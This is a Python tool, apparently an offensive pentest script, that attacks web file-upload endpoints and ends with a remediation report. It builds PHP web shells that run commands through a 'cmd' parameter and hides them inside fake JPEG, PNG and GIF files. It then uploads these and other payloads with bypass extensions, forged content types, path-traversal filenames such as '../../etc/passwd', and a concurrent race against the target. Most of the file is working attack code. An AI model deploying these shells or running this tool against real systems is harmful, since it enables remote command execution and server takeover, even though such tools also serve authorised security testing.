#!/usr/bin/env python3
"""
VibeCheck File Upload Arsenal

Enterprise-grade file upload vulnerability testing tool.

Features:
- Modular test suites (basic, MIME, polyglot, path traversal, race condition).
- Class-based design for reuse in CI/CD or internal tooling.
- Structured findings with severity and description.
"""

import argparse
import os
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin

import requests

# --- COLORS (can be disabled later if needed) ---
G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'


def banner():
    print(fr"""{G}
    __   _ __           ________              __  
    \ \ / /(_)        / ____/ /_  ___  _____/ /__
     \ V / / /|      / /   / __ \/ _ \/ ___/ //_/
      \ / / / |     / /___/ / / /  __/ /__/ ,<   
       \_/_/_/|_|____\____/_/ /_/\___/\___/_/|_|  
                /_____/ File Upload Arsenal v3.0
    {W}""")


# -------- Polyglot generators (from your guide) -------- #

def polyglot_jpeg_php():
    jpeg_header = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01'
    php_payload = b'<?php system($_GET["cmd"]); ?>'
    return jpeg_header + php_payload + b'\xff\xd9'


def polyglot_png_php():
    png_header = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR'
    php_chunk = b'tEXt<?php system($_GET["cmd"]); ?>'
    return png_header + php_chunk


def polyglot_gif_php():
    return b'GIF89a<?php system($_GET["cmd"]); ?>'


# -------- Helper for upload discovery (from guide) -------- #

COMMON_UPLOAD_PATHS = [
    "uploads", "upload", "files", "media",
    "attachments", "images", "assets",
    "static", "public", "storage"
]  # [file:1]


def filename_variants(filename: str):
    base, ext = os.path.splitext(filename)
    return {
        filename,
        filename.lower(),
        filename.upper(),
        base,                         # without extension
        filename.replace(".", ""),    # no dots
        filename.replace(" ", "_"),   # spaces to underscore
    }  # [file:1]


def try_find_uploaded(base_url, filename, session, verbose=False):
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    for variant in filename_variants(filename):
        for path in COMMON_UPLOAD_PATHS:
            url = urljoin(base, f"/{path}/{variant}")
            try:
                r = session.get(url, timeout=3)
                if verbose:
                    print(f"{Y}[*] Probing {url} -> {r.status_code}{W}")
                if r.status_code == 200:
                    print(f"{G}[+] Potential upload location: {url}{W}")
                    return url
            except Exception:
                continue
    return None


# -------- Core tester class (enterprise-style) -------- #

class FileUploadTester:
    def __init__(self, target_url: str, param_name: str,
                 access_pattern: str | None = None,
                 verbose: bool = False):
        self.target_url = target_url
        self.param_name = param_name
        self.access_pattern = access_pattern  # e.g. https://site/upload/{filename}
        self.verbose = verbose
        self.session = requests.Session()
        self.vulnerabilities: list[dict] = []

    # --- logging helpers ---

    def log(self, msg: str):
        if self.verbose:
            print(f"{Y}[*] {msg}{W}")

    def info(self, msg: str):
        print(f"{Y}[*] {msg}{W}")

    def success(self, msg: str, severity: str = "Medium", vuln_type: str = "Generic"):
        print(f"{G}[+] {msg}{W}")
        self.vulnerabilities.append({
            "type": vuln_type,
            "severity": severity,
            "message": msg,
        })

    def warn(self, msg: str):
        print(f"{Y}[!] {msg}{W}")

    def error(self, msg: str):
        print(f"{R}[-] {msg}{W}")

    # --- generic helpers ---

    def detect_simple_success(self, response: requests.Response) -> bool:
        text = response.text.lower()
        keywords = ["[+]", "success", "uploaded", "file saved", "upload complete"]
        return response.status_code in (200, 201) and any(k in text for k in keywords)

    def make_extensions_list(self):
        # Based on your checklist extensions set.[file:1]
        return [
            "php", "php2", "php3", "php4", "php5", "php6", "php7",
            "phtml", "phps", "pht", "phar",
            "asp", "aspx", "ascx", "ashx", "asmx",
            "jsp", "jspx", "jsw", "jsv", "jspf",
            "cfm", "cfml", "cfc",
            "html", "htm", "js",
            "php.jpg", "php.png", "php.gif",
            "php.php.jpg", "php.jpg.php",
            "php%00.jpg",
            "php.", "php .jpg",
        ]  # [file:1]

    def make_mimes_list(self):
        # Derived from MIME bypass section.[file:1]
        return [
            "image/jpeg",
            "image/png",
            "image/gif",
            "application/pdf",
            "text/plain",
            "application/octet-stream",
        ]  # [file:1]

    def build_payload_content(self, ext: str):
        php_shell = "<?php system($_GET['cmd']); ?>"
        # image/polyglot cases
        e = ext.lower()
        if "jpg" in e or "jpeg" in e:
            return polyglot_jpeg_php()
        if "png" in e:
            return polyglot_png_php()
        if "gif" in e:
            return polyglot_gif_php()
        return php_shell

    # -------- Test suites -------- #

    def test_basic(self):
        """Direct .php and simple tricks (P0)."""  # [file:1]
        self.info("Running BASIC upload tests (direct .php, double extensions)...")

        candidates = [
            ("shell.php", "<?php echo 'VULNERABLE'; ?>", "application/x-php"),
            ("shell.php.jpg", "<?php echo 'VULNERABLE'; ?>", "image/jpeg"),
            ("shell.pHp", "<?php echo 'VULNERABLE'; ?>", "application/x-php"),
            ("shell.php%00.jpg", "<?php echo 'VULNERABLE'; ?>", "image/jpeg"),
        ]  # [file:1]

        for fname, content, mime in candidates:
            files = {self.param_name: (fname, content, mime)}
            self.log(f"Uploading {fname} with MIME {mime}")
            try:
                r = self.session.post(self.target_url, files=files, timeout=10)
            except Exception as e:
                self.error(f"Connection error for {fname}: {e}")
                continue

            if r.status_code == 200:
                self.success(
                    f"Endpoint accepts {fname} ({mime})",
                    severity="Critical",
                    vuln_type="DirectUpload"
                )

    def test_mime(self):
        """MIME/Content-Type bypass tests (P1)."""  # [file:1]
        self.info("Running MIME/Content-Type bypass tests...")

        payloads = [
            ("shell.jpg", "<?php echo 'MIME-BYPASS'; ?>", "image/jpeg"),
            ("shell.png", "<?php echo 'MIME-BYPASS'; ?>", "image/png"),
            ("shell.gif", "<?php echo 'MIME-BYPASS'; ?>", "image/gif"),
            ("shell.pdf", "<?php echo 'MIME-BYPASS'; ?>", "application/pdf"),
            ("shell.bin", "<?php echo 'MIME-BYPASS'; ?>", "application/octet-stream"),
        ]  # [file:1]

        for fname, content, mime in payloads:
            files = {self.param_name: (fname, content, mime)}
            self.log(f"Uploading {fname} as {mime}")
            try:
                r = self.session.post(self.target_url, files=files, timeout=10)
            except Exception as e:
                self.error(f"Connection error for {fname}: {e}")
                continue

            if r.status_code == 200:
                self.success(
                    f"Accepts suspicious payload {fname} with MIME {mime}",
                    severity="Medium",
                    vuln_type="MIMEBypass"
                )

    def create_polyglots(self):
        """Polyglot corpus from your guide."""  # [file:1]
        polyglots = {
            "jpegphp.jpg": polyglot_jpeg_php(),
            "pngphp.png": polyglot_png_php(),
            "gifphp.gif": polyglot_gif_php(),
            # simple JS-in-PDF polyglot
            "pdfjs.pdf": (
                b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R "
                b"/OpenAction << /S /JavaScript /JS (app.alert('PDF-JS Polyglot')) >> >>\nendobj\n"
            ),
        }
        return polyglots

    def test_polyglot(self):
        """Polyglot / magic-byte bypass tests (P0)."""  # [file:1]
        self.info("Running polyglot (magic bytes) tests...")

        mimes = self.make_mimes_list()
        polyglots = self.create_polyglots()

        for fname, content in polyglots.items():
            for mime in mimes:
                files = {self.param_name: (fname, content, mime)}
                self.log(f"Uploading polyglot {fname} as {mime}")
                try:
                    r = self.session.post(self.target_url, files=files, timeout=10)
                except Exception as e:
                    self.error(f"Connection error for {fname} ({mime}): {e}")
                    continue

                if r.status_code == 200:
                    self.success(
                        f"Accepts polyglot {fname} with MIME {mime}",
                        severity="Critical",
                        vuln_type="PolyglotBypass"
                    )

    def test_path(self):
        """Path traversal in filename/parameter (P0)."""  # [file:1]
        self.info("Running path traversal tests in filename...")

        traversals = [
            "../../etc/passwd",
            "../../index.php",
            "..\\..\\windows\\system32\\cmd.exe",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..00..00etcpasswd",
        ]  # [file:1]

        for traversal in traversals:
            files = {self.param_name: (traversal, "PATH_TRAVERSAL_TEST", "text/plain")}
            self.log(f"Uploading with filename={traversal}")
            try:
                r = self.session.post(self.target_url, files=files, timeout=10)
            except Exception as e:
                self.error(f"Connection error for traversal {traversal}: {e}")
                continue

            if r.status_code == 200:
                self.success(
                    f"Possible path traversal via filename: {traversal}",
                    severity="Critical",
                    vuln_type="PathTraversal"
                )

    def _race_worker(self, filename: str) -> bool:
        """Single race attempt."""  # [file:1]
        content = f"<?php echo 'RACE-{filename}'; ?>"
        files = {self.param_name: (filename, content, "application/x-php")}
        upload_resp = self.session.post(self.target_url, files=files, timeout=10)
        if upload_resp.status_code not in (200, 201):
            return False

        if not self.access_pattern:
            return False

        access_url = self.access_pattern.format(filename=filename)
        # Hit the URL a few times quickly
        for _ in range(10):
            try:
                r = self.session.get(access_url, timeout=3)
                if f"RACE-{filename}" in r.text:
                    self.success(
                        f"Race condition: executable upload reachable at {access_url}",
                        severity="High",
                        vuln_type="RaceCondition"
                    )
                    return True
            except Exception:
                continue
        return False

    def test_race(self):
        """TOCTOU race condition on upload + access (P1)."""  # [file:1]
        if not self.access_pattern:
            self.warn("Race test skipped: --access-pattern not provided.")
            return

        self.info("Running race condition tests (concurrent upload+access)...")

        def job():
            uid = os.urandom(4).hex()
            fname = f"{uid}.php"
            return self._race_worker(fname)

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(job) for _ in range(20)]
            for fut in futures:
                try:
                    if fut.result():
                        return  # stop on first success
                except Exception as e:
                    self.error(f"Race worker error: {e}")

    # -------- Orchestrator -------- #

    def run_modes(self, modes: list[str]):
        """Run selected modes in sequence."""
        available = {
            "basic": self.test_basic,
            "mime": self.test_mime,
            "polyglot": self.test_polyglot,
            "path": self.test_path,
            "race": self.test_race,
        }

        if "all" in modes:
            ordered = ["basic", "mime", "polyglot", "path", "race"]
        else:
            ordered = [m for m in modes if m in available]

        if not ordered:
            self.error("No valid modes selected.")
            return

        self.info(f"Running modes: {', '.join(ordered)}")
        for m in ordered:
            try:
                available[m]()
                time.sleep(0.5)  # light pacing
            except KeyboardInterrupt:
                self.error("Interrupted by user.")
                break
            except Exception as e:
                self.error(f"Mode {m} failed: {e}")

    def generate_report(self) -> str:
        lines = []
        lines.append("FILE UPLOAD VULNERABILITY REPORT")
        lines.append("=" * 40)
        lines.append(f"Target: {self.target_url}")
        lines.append(f"Parameter: {self.param_name}")
        lines.append(f"Findings: {len(self.vulnerabilities)}")
        lines.append("")

        if not self.vulnerabilities:
            lines.append("No critical vulnerabilities detected in automated checks.")
            lines.append("")
            lines.append("Still recommended:")
            lines.append("1. Implement strict server-side validation.")
            lines.append("2. Validate magic bytes, not just extensions.")
            lines.append("3. Store files outside webroot.")
            lines.append("4. Implement Content Disarm & Reconstruction pipeline.")  # [file:1]
        else:
            for i, v in enumerate(self.vulnerabilities, start=1):
                lines.append(f"{i}. [{v['severity']}] {v['type']} - {v['message']}")
            lines.append("")
            lines.append("Recommended actions (from file upload checklist):")
            lines.append("1. Immediately block dynamic extensions (.php, .asp, .jsp, etc.).")  # [file:1]
            lines.append("2. Short-term: enforce magic byte verification.")
            lines.append("3. Medium-term: move uploads outside webroot with strict ACLs.")
            lines.append("4. Long-term: introduce file sanitization pipeline (CDR).")  # [file:1]

        return "\n".join(lines)


# -------- CLI entrypoint -------- #

def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="VibeCheck File Upload Arsenal - Enterprise File Upload Tester"
    )
    parser.add_argument(
        "-u", "--url", required=True,
        help="Target upload URL (e.g., https://target.com/upload)"
    )
    parser.add_argument(
        "-p", "--param", required=True,
        help="File parameter name (e.g., 'file', 'upload', 'image')"
    )
    parser.add_argument(
        "--mode", nargs="+", default=["all"],
        help="Test modes: basic mime polyglot path race all (default: all)"
    )
    parser.add_argument(
        "-a", "--access-pattern",
        help="Access URL pattern for race condition tests, "
             "e.g. https://target.com/uploads/{filename}"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="Verbose logging"
    )
    parser.add_argument(
        "-o", "--output",
        help="Path to save report (e.g., report.txt)"
    )
    return parser.parse_args(argv)


def main(argv=None):
    banner()
    args = parse_args(argv)

    tester = FileUploadTester(
        target_url=args.url,
        param_name=args.param,
        access_pattern=args.access_pattern,
        verbose=args.verbose,
    )

    tester.run_modes(args.mode)
    report = tester.generate_report()

    print()
    print(report)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(report)
        print(f"\n{G}[+] Report saved to {args.output}{W}")


if __name__ == "__main__":
    main()
